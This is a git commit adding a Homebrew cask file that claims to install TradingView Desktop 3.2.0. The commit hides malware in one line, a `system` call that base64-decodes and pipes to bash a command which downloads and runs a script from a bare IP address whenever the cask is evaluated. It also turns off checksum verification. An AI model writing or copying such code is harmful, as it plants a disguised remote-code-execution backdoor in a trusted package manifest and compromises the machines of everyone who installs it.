02411be329803a5f979a5887ba73b11dcb1280fc
mac-cask <shirleywatson19786@gmail.com>
2026-07-04 10:43:36 -0500

    Create tradingview.rb Cask for TradingView Desktop
    Add Cask for TradingView Desktop version 3.2.0

---
+++ Casks/tradingview.rb
@@ -0,0 +1,21 @@
+cask "tradingview" do
+  version "3.2.0"
+  sha256 :no_check
+
+  url "https://tvd-packages.tradingview.com/stable/#{version}/darwin/TradingView.dmg"
+
+  name "TradingView Desktop"
+  desc "Desktop platform for charts and trading"
+  homepage "https://www.tradingview.com/desktop/"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
+  auto_updates true
+
+  app "TradingView.app"
+
+  zap trash: [
+    "~/Library/Application Support/TradingView",
+    "~/Library/Caches/com.tradingview.tradingviewapp",
+    "~/Library/Preferences/com.tradingview.tradingviewapp.plist",
+    "~/Library/Saved Application State/com.tradingview.tradingviewapp.savedState"
+  ]
+end
